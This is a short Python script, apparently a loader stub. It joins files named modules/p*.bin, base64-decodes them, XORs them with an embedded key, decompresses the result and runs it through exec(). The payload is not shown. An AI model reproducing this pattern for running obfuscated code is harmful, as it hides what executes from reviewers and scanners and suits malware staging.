#!/usr/bin/env python3
import sys, zlib, base64, marshal
from pathlib import Path

KEY = base64.b64decode("Z4qxwX25ljdpmhvPbVhBvPRdFdE/23mfaNPTKQpuTgo=")

def xor_bytes(data, key):
    klen = len(key)
    return bytes(b ^ key[i % klen] for i, b in enumerate(data))

BASE = Path(__file__).resolve().parent
MODS = BASE / "modules"

try:
    data = b"".join(
        p.read_bytes()
        for p in sorted(MODS.glob("p*.bin"), key=lambda x: x.name)
    )
    decoded = base64.b64decode(data)
    plain = zlib.decompress(xor_bytes(decoded, KEY))
except Exception as e:
    print("loader error:", e)
    sys.exit(1)

try:
    code = marshal.loads(plain)
except Exception:
    code = compile(plain, "<run>", "exec")

g = {
    "__name__": "__main__",
    "__file__": "<run>",
}

exec(code, g)
